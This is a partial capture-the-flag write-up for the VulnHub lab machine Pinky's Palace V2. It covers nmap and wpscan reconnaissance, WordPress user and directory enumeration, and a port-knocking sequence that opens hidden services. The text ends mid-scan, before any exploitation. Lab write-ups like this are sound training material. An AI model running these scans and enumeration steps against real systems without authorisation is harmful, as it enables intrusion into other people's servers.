# Pinky's Palace V2 | VulnHub
https://www.vulnhub.com/entry/pinkys-palace-v2,229/

### 1. Scan
```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -A -p- -T4 192.168.34.143
Nmap scan report for 192.168.34.143
Host is up, received arp-response (0.0016s latency).
Scanned at 2021-03-18 04:15:43 EDT for 24s
Not shown: 65531 closed ports
Reason: 65531 resets
PORT      STATE    SERVICE REASON         VERSION
80/tcp    open     http    syn-ack ttl 64 Apache httpd 2.4.25 ((Debian))
|_http-generator: WordPress 4.9.4
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Pinky&#039;s Blog &#8211; Just another WordPress site
4655/tcp  filtered unknown no-response
7654/tcp  filtered unknown no-response
31337/tcp filtered Elite   no-response
MAC Address: 00:0C:29:9C:6A:9B (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=3/18%OT=80%CT=1%CU=35965%PV=Y%DS=1%DC=D%G=Y%M=000C29%T
OS:M=60530C47%P=x86_64-pc-linux-gnu)SEQ(SP=FB%GCD=1%ISR=10B%TI=Z%CI=I%II=I%
OS:TS=8)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5
OS:=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=
OS:7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%
OS:A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0
OS:%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S
OS:=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R
OS:=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N
OS:%T=40%CD=S)

Uptime guess: 198.046 days (since Tue Sep  1 03:09:20 2020)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=251 (Good luck!)
IP ID Sequence Generation: All zeros

TRACEROUTE
HOP RTT     ADDRESS
1   1.61 ms 192.168.34.143

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Mar 18 04:16:07 2021 -- 1 IP address (1 host up) scanned in 26.32 seconds
```
The machine is running an Apache server with Wordpress. There are also some filtered ports: 4655, 7654 and 31337.

### 2. Enumeration
The site is a Wordpress template with a couple of posts. The version was from 2018, which is probably around when this box came out. I run some wpscan and username enumeration:
```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ wpscan --url http://192.168.34.143 --plugins-detection aggressive --plugins-version-detection aggressive
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.14
                               
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed.

[+] URL: http://192.168.34.143/ [192.168.34.143]
[+] Started: Thu Mar 18 04:20:48 2021

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.25 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.34.143/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] WordPress readme found: http://192.168.34.143/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.34.143/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.9.4 identified (Insecure, released on 2018-02-06).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://192.168.34.143/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=4.9.4'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://192.168.34.143/, Match: 'WordPress 4.9.4'
 |
 | [!] 30 vulnerabilities identified:
 |
 | [!] Title: WordPress <= 4.9.4 - Application Denial of Service (DoS) (unpatched)
 |     References:
 |      - https://wpscan.com/vulnerability/5e0c1ddd-fdd0-421b-bdbe-3eee6b75c919
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6389
 |      - https://baraktawily.blogspot.fr/2018/02/how-to-dos-29-of-world-wide-websites.html
 |      - https://github.com/quitten/doser.py
 |      - https://thehackernews.com/2018/02/wordpress-dos-exploit.html
 |
 | [!] Title: WordPress 3.7-4.9.4 - Remove localhost Default
 |     Fixed in: 4.9.5
 |     References:
 |      - https://wpscan.com/vulnerability/835614a2-ad92-4027-b485-24b39038171d
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10101
 |      - https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/804363859602d4050d9a38a21f5a65d9aec18216
 |
 | [!] Title: WordPress 3.7-4.9.4 - Use Safe Redirect for Login
 |     Fixed in: 4.9.5
 |     References:
 |      - https://wpscan.com/vulnerability/01b587e0-0a86-47af-a088-6e5e350e8247
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10100
 |      - https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/14bc2c0a6fde0da04b47130707e01df850eedc7e
 |
 | [!] Title: WordPress 3.7-4.9.4 - Escape Version in Generator Tag
 |     Fixed in: 4.9.5
 |     References:
 |      - https://wpscan.com/vulnerability/2b7c77c3-8dbc-4a2a-9ea3-9929c3373557
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10102
 |      - https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/31a4369366d6b8ce30045d4c838de2412c77850d
 |
 | [!] Title: WordPress <= 4.9.6 - Authenticated Arbitrary File Deletion
 |     Fixed in: 4.9.7
 |     References:
 |      - https://wpscan.com/vulnerability/42ab2bd9-bbb1-4f25-a632-1811c5130bb4
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12895
 |      - https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/
 |      - http://blog.vulnspy.com/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility-Exploit/
 |      - https://github.com/WordPress/WordPress/commit/c9dce0606b0d7e6f494d4abe7b193ac046a322cd
 |      - https://wordpress.org/news/2018/07/wordpress-4-9-7-security-and-maintenance-release/
 |      - https://www.wordfence.com/blog/2018/07/details-of-an-additional-file-deletion-vulnerability-patched-in-wordpress-4-9-7/
 |
 | [!] Title: WordPress <= 5.0 - Authenticated File Delete
 |     Fixed in: 4.9.9
 |     References:
 |      - https://wpscan.com/vulnerability/e3ef8976-11cb-4854-837f-786f43cbdf44
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20147
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |
 | [!] Title: WordPress <= 5.0 - Authenticated Post Type Bypass
 |     Fixed in: 4.9.9
 |     References:
 |      - https://wpscan.com/vulnerability/999dba5a-82fb-4717-89c3-6ed723cc7e45
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20152
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |      - https://blog.ripstech.com/2018/wordpress-post-type-privilege-escalation/
 |
 | [!] Title: WordPress <= 5.0 - PHP Object Injection via Meta Data
 |     Fixed in: 4.9.9
 |     References:
 |      - https://wpscan.com/vulnerability/046ff6a0-90b2-4251-98fc-b7fba93f8334
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20148
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |
 | [!] Title: WordPress <= 5.0 - Authenticated Cross-Site Scripting (XSS)
 |     Fixed in: 4.9.9
 |     References:
 |      - https://wpscan.com/vulnerability/3182002e-d831-4412-a27d-a5e39bb44314
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20153
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |
 | [!] Title: WordPress <= 5.0 - Cross-Site Scripting (XSS) that could affect plugins
 |     Fixed in: 4.9.9
 |     References:
 |      - https://wpscan.com/vulnerability/7f7a0795-4dd7-417d-804e-54f12595d1e4
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20150
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |      - https://github.com/WordPress/WordPress/commit/fb3c6ea0618fcb9a51d4f2c1940e9efcd4a2d460
 |
 | [!] Title: WordPress <= 5.0 - User Activation Screen Search Engine Indexing
 |     Fixed in: 4.9.9
 |     References:
 |      - https://wpscan.com/vulnerability/65f1aec4-6d28-4396-88d7-66702b21c7a2
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20151
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |
 | [!] Title: WordPress <= 5.0 - File Upload to XSS on Apache Web Servers
 |     Fixed in: 4.9.9
 |     References:
 |      - https://wpscan.com/vulnerability/d741f5ae-52ca-417d-a2ca-acdfb7ca5808
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20149
 |      - https://wordpress.org/news/2018/12/wordpress-5-0-1-security-release/
 |      - https://github.com/WordPress/WordPress/commit/246a70bdbfac3bd45ff71c7941deef1bb206b19a
 |
 | [!] Title: WordPress 3.7-5.0 (except 4.9.9) - Authenticated Code Execution
 |     Fixed in: 4.9.9
 |     References:
 |      - https://wpscan.com/vulnerability/1a693e57-f99c-4df6-93dd-0cdc92fd0526
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8942
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8943
 |      - https://blog.ripstech.com/2019/wordpress-image-remote-code-execution/
 |      - https://www.rapid7.com/db/modules/exploit/multi/http/wp_crop_rce
 |
 | [!] Title: WordPress 3.9-5.1 - Comment Cross-Site Scripting (XSS)
 |     Fixed in: 4.9.10
 |     References:
 |      - https://wpscan.com/vulnerability/d150f43f-6030-4191-98b8-20ae05585936
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9787
 |      - https://github.com/WordPress/WordPress/commit/0292de60ec78c5a44956765189403654fe4d080b
 |      - https://wordpress.org/news/2019/03/wordpress-5-1-1-security-and-maintenance-release/
 |      - https://blog.ripstech.com/2019/wordpress-csrf-to-rce/
 |
 | [!] Title: WordPress <= 5.2.2 - Cross-Site Scripting (XSS) in URL Sanitisation
 |     Fixed in: 4.9.11
 |     References:
 |      - https://wpscan.com/vulnerability/4494a903-5a73-4cad-8c14-1e7b4da2be61
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16222
 |      - https://wordpress.org/news/2019/09/wordpress-5-2-3-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/30ac67579559fe42251b5a9f887211bf61a8ed68
 |      - https://hackerone.com/reports/339483
 |
 | [!] Title: WordPress <= 5.2.3 - Stored XSS in Customizer
 |     Fixed in: 4.9.12
 |     References:
 |      - https://wpscan.com/vulnerability/d39a7b84-28b9-4916-a2fc-6192ceb6fa56
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17674
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |
 | [!] Title: WordPress <= 5.2.3 - Unauthenticated View Private/Draft Posts
 |     Fixed in: 4.9.12
 |     References:
 |      - https://wpscan.com/vulnerability/3413b879-785f-4c9f-aa8a-5a4a1d5e0ba2
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17671
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |      - https://github.com/WordPress/WordPress/commit/f82ed753cf00329a5e41f2cb6dc521085136f308
 |      - https://0day.work/proof-of-concept-for-wordpress-5-2-3-viewing-unauthenticated-posts/
 |
 | [!] Title: WordPress <= 5.2.3 - Stored XSS in Style Tags
 |     Fixed in: 4.9.12
 |     References:
 |      - https://wpscan.com/vulnerability/d005b1f8-749d-438a-8818-21fba45c6465
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17672
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |
 | [!] Title: WordPress <= 5.2.3 - JSON Request Cache Poisoning
 |     Fixed in: 4.9.12
 |     References:
 |      - https://wpscan.com/vulnerability/7804d8ed-457a-407e-83a7-345d3bbe07b2
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17673
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://github.com/WordPress/WordPress/commit/b224c251adfa16a5f84074a3c0886270c9df38de
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |
 | [!] Title: WordPress <= 5.2.3 - Server-Side Request Forgery (SSRF) in URL Validation 
 |     Fixed in: 4.9.12
 |     References:
 |      - https://wpscan.com/vulnerability/26a26de2-d598-405d-b00c-61f71cfacff6
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17669
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17670
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://github.com/WordPress/WordPress/commit/9db44754b9e4044690a6c32fd74b9d5fe26b07b2
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |
 | [!] Title: WordPress <= 5.2.3 - Admin Referrer Validation
 |     Fixed in: 4.9.12
 |     References:
 |      - https://wpscan.com/vulnerability/715c00e3-5302-44ad-b914-131c162c3f71
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17675
 |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
 |      - https://github.com/WordPress/WordPress/commit/b183fd1cca0b44a92f0264823dd9f22d2fd8b8d0
 |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
 |
 | [!] Title: WordPress <= 5.3 - Authenticated Improper Access Controls in REST API
 |     Fixed in: 4.9.13
 |     References:
 |      - https://wpscan.com/vulnerability/4a6de154-5fbd-4c80-acd3-8902ee431bd8
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-20043
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16788
 |      - https://wordpress.org/news/2019/12/wordpress-5-3-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-g7rg-hchx-c2gw
 |
 | [!] Title: WordPress <= 5.3 - Authenticated Stored XSS via Crafted Links
 |     Fixed in: 4.9.13
 |     References:
 |      - https://wpscan.com/vulnerability/23553517-34e3-40a9-a406-f3ffbe9dd265
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16773
 |      - https://wordpress.org/news/2019/12/wordpress-5-3-1-security-and-maintenance-release/
 |      - https://hackerone.com/reports/509930
 |      - https://github.com/WordPress/wordpress-develop/commit/1f7f3f1f59567e2504f0fbebd51ccf004b3ccb1d
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-xvg2-m2f4-83m7
 |
 | [!] Title: WordPress <= 5.3 - Authenticated Stored XSS via Block Editor Content
 |     Fixed in: 4.9.13
 |     References:
 |      - https://wpscan.com/vulnerability/be794159-4486-4ae1-a5cc-5c190e5ddf5f
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16781
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16780
 |      - https://wordpress.org/news/2019/12/wordpress-5-3-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-pg4x-64rh-3c9v
 |
 | [!] Title: WordPress <= 5.3 - wp_kses_bad_protocol() Colon Bypass
 |     Fixed in: 4.9.13
 |     References:
 |      - https://wpscan.com/vulnerability/8fac612b-95d2-477a-a7d6-e5ec0bb9ca52
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-20041
 |      - https://wordpress.org/news/2019/12/wordpress-5-3-1-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/commit/b1975463dd995da19bb40d3fa0786498717e3c53
 |
 | [!] Title: WordPress < 5.4.1 - Password Reset Tokens Failed to Be Properly Invalidated
 |     Fixed in: 4.9.14
 |     References:
 |      - https://wpscan.com/vulnerability/7db191c0-d112-4f08-a419-a1cd81928c4e
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11027
 |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
 |      - https://core.trac.wordpress.org/changeset/47634/
 |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-ww7v-jg8c-q6jw
 |
 | [!] Title: WordPress < 5.4.1 - Unauthenticated Users View Private Posts
 |     Fixed in: 4.9.14
 |     References:
 |      - https://wpscan.com/vulnerability/d1e1ba25-98c9-4ae7-8027-9632fb825a56
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11028
 |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
 |      - https://core.trac.wordpress.org/changeset/47635/
 |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-xhx9-759f-6p2w
 |
 | [!] Title: WordPress < 5.4.1 - Authenticated Cross-Site Scripting (XSS) in Customizer
 |     Fixed in: 4.9.14
 |     References:
 |      - https://wpscan.com/vulnerability/4eee26bd-a27e-4509-a3a5-8019dd48e429
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11025
 |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
 |      - https://core.trac.wordpress.org/changeset/47633/
 |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-4mhg-j6fx-5g3c
 |
 | [!] Title: WordPress < 5.4.1 - Cross-Site Scripting (XSS) in wp-object-cache
 |     Fixed in: 4.9.14
 |     References:
 |      - https://wpscan.com/vulnerability/e721d8b9-a38f-44ac-8520-b4a9ed6a5157
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11029
 |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
 |      - https://core.trac.wordpress.org/changeset/47637/
 |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-568w-8m88-8g2c
 |
 | [!] Title: WordPress < 5.4.1 - Authenticated Cross-Site Scripting (XSS) in File Uploads
 |     Fixed in: 4.9.14
 |     References:
 |      - https://wpscan.com/vulnerability/55438b63-5fc9-4812-afc4-2f1eff800d5f
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11026
 |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
 |      - https://core.trac.wordpress.org/changeset/47638/
 |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-3gw2-4656-pfr2
 |      - https://hackerone.com/reports/179695

[i] The main theme could not be detected.

[+] Enumerating All Plugins (via Aggressive Methods)
 Checking Known Locations - Time: 00:03:27 <=============================================================================================================================================================================================================================================================================================================================> (92354 / 92354) 100.00% Time: 00:03:27
[+] Checking Plugin Versions (via Aggressive Methods)

[i] Plugin(s) Identified:

[+] akismet
 | Location: http://192.168.34.143/wp-content/plugins/akismet/
 | Last Updated: 2021-03-02T18:10:00.000Z
 | Readme: http://192.168.34.143/wp-content/plugins/akismet/readme.txt
 | [!] The version is out of date, the latest version is 4.1.9
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.34.143/wp-content/plugins/akismet/, status: 200
 |
 | Version: 4.0.2 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.34.143/wp-content/plugins/akismet/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://192.168.34.143/wp-content/plugins/akismet/readme.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <====================================================================================================================================================================================================================================================================================================================================> (22 / 22) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 2
 | Requests Remaining: 23

[+] Finished: Thu Mar 18 04:24:46 2021
[+] Requests Done: 92426
[+] Cached Requests: 6
[+] Data Sent: 24.789 MB
[+] Data Received: 28.68 MB
[+] Memory used: 388.008 MB
[+] Elapsed time: 00:03:58
                                                                                                                                                                                                                                                                                                                                                                                                                 
┌──(kali㉿kali)-[~/Desktop]
└─$ wpscan --url http://192.168.34.143 --enumerate u                                                                                                                                                                                                                                                                                                                                                         5 ⨯
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.14
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.34.143/ [192.168.34.143]
[+] Started: Thu Mar 18 04:28:28 2021

...

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <===================================================================================================================================================================================================================================================================================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] pinky1337
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpscan.com/register

[+] Finished: Thu Mar 18 04:28:29 2021
[+] Requests Done: 25
[+] Cached Requests: 30
[+] Data Sent: 6.309 KB
[+] Data Received: 178.166 KB
[+] Memory used: 121.234 MB
[+] Elapsed time: 00:00:00
```
There is only one user, pinky1337 who was the creator of the only post in the blog.  
Dirbusting the site reveals a directory called /secret.
```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ dirsearch -u http://192.168.34.143 -x 403

  _|. _ _  _  _  _ _|_    v0.4.1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10848

Error Log: /home/kali/Extra-Tools/dirsearch/logs/errors-21-03-18_04-37-18.log

Target: http://192.168.34.143/
Output File: /home/kali/Extra-Tools/dirsearch/reports/192.168.34.143/_21-03-18_04-37-18.txt

[04:37:18] Starting: 
[04:37:44] 301 -    0B  - /index.php  ->  http://192.168.34.143/
[04:37:44] 301 -    0B  - /index.php/login/  ->  http://192.168.34.143/login/
[04:37:45] 200 -   19KB - /license.txt                                                                  
[04:37:52] 200 -    7KB - /readme.html                                                         
[04:37:54] 301 -  317B  - /secret  ->  http://192.168.34.143/secret/                                    
[04:37:54] 200 -  941B  - /secret/   
[04:37:59] 302 -    0B  - /wordpress/  ->  http://192.168.34.143/wordpress/wp-admin/setup-config.php              
[04:37:59] 302 -    0B  - /wordpress/wp-login.php  ->  http://192.168.34.143/wordpress/wp-admin/setup-config.php
[04:37:59] 301 -  319B  - /wp-admin  ->  http://192.168.34.143/wp-admin/
[04:37:59] 500 -    3KB - /wp-admin/setup-config.php
[04:37:59] 200 -    0B  - /wp-config.php     
[04:37:59] 301 -  321B  - /wp-content  ->  http://192.168.34.143/wp-content/
[04:37:59] 200 -    0B  - /wp-content/
[04:37:59] 302 -    0B  - /wp-admin/  ->  http://pinkydb/wp-login.php?redirect_to=http%3A%2F%2F192.168.34.143%2Fwp-admin%2F&reauth=1
[04:37:59] 400 -    1B  - /wp-admin/admin-ajax.php   
[04:37:59] 200 -    1KB - /wp-admin/install.php                           
[04:37:59] 200 -   69B  - /wp-content/plugins/akismet/akismet.php
[04:37:59] 500 -    0B  - /wp-content/plugins/hello.php                                         
[04:37:59] 200 -    0B  - /wp-cron.php                                 
[04:37:59] 500 -    0B  - /wp-includes/rss-functions.php
[04:37:59] 301 -  322B  - /wp-includes  ->  http://192.168.34.143/wp-includes/
[04:37:59] 200 -    2KB - /wp-login.php                    
[04:37:59] 200 -   40KB - /wp-includes/
[04:37:59] 302 -    0B  - /wp-signup.php  ->  http://pinkydb/wp-login.php?action=register
[04:38:00] 405 -   42B  - /xmlrpc.php
```

In the directory is a single file called: `bambam.txt` containing:
```
8890
7000
666

pinkydb
```
The first three look like port numbers, so this could be a port knocking sequence. This would explain the filtered ports seen previously.  

### 3. Open some more ports

Use a port knocking tool to try all permutations of the ports: https://github.com/nathunandwani/port-knocker.  
After doing it, it can now be seen that the three ports are now accessible.
```bash
┌──(kali㉿kali)-[~/Desktop/port-knocker]
└─$ python knock.py 192.168.34.143 8890 7000 666
Testing permutation: (8890, 7000, 666)
Knocked on port 8890
Knocked on port 7000
Knocked on port 666
Testing permutation: (8890, 666, 7000)
Knocked on port 8890
Knocked on port 666
Knocked on port 7000
Testing permutation: (7000, 8890, 666)
Knocked on port 7000
Knocked on port 8890
Knocked on port 666
Testing permutation: (7000, 666, 8890)
Knocked on port 7000
Knocked on port 666
Knocked on port 8890
Testing permutation: (666, 8890, 7000)
Knocked on port 666
Knocked on port 8890
Knocked on port 7000
Testing permutation: (666, 7000, 8890)
Knocked on port 666
Knocked on port 7000
Knocked on port 8890
                                                                                                                                                                                                                                                                                                                                                                                                                 
┌──(kali㉿kali)-[~/Desktop/port-knocker]
└─$ nmap -sV -p- 192.168.34.143                            
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-18 05:03 EDT
Nmap scan report for pinkydb (192.168.34.143)
Host is up (0.00043s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.25 ((Debian))
4655/tcp  open  ssh     OpenSSH 7.4p1 Debian 10+deb9u3 (protocol 2.0)
7654/tcp  open  http    nginx 1.10.3
31337/tcp open  Elite?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port31337-TCP:V=7.91%I=7%D=3/18%Time=60531775%P=x86_64-pc-linux-gnu%r(N
SF:ULL,59,"\[\+\]\x20Welcome\x20to\x20The\x20Daemon\x20\[\+\]\n\0This\x20i
SF:s\x20soon\x20to\x20be\x20our\x20backdoor\n\0into\x20Pinky's\x20Palace\.
SF:\n=>\x20\0")%r(GetRequest,6B,"\[\+\]\x20Welcome\x20to\x20The\x20Daemon\
SF:x20\[\+\]\n\0This\x20is\x20soon\x20to\x20be\x20our\x20backdoor\n\0into\
SF:x20Pinky's\x20Palace\.\n=>\x20\0GET\x20/\x20HTTP/1\.0\r\n\r\n")%r(SIPOp
SF:tions,138,"\[\+\]\x20Welcome\x20to\x20The\x20Daemon\x20\[\+\]\n\0This\x
SF:20is\x20soon\x20to\x20be\x20our\x20backdoor\n\0into\x20Pinky's\x20Palac
SF:e\.\n=>\x20\0OPTIONS\x20sip:nm\x20SIP/2\.0\r\nVia:\x20SIP/2\.0/TCP\x20n
SF:m;branch=foo\r\nFrom:\x20<sip:nm@nm>;tag=root\r\nTo:\x20<sip:nm2@nm2>\r
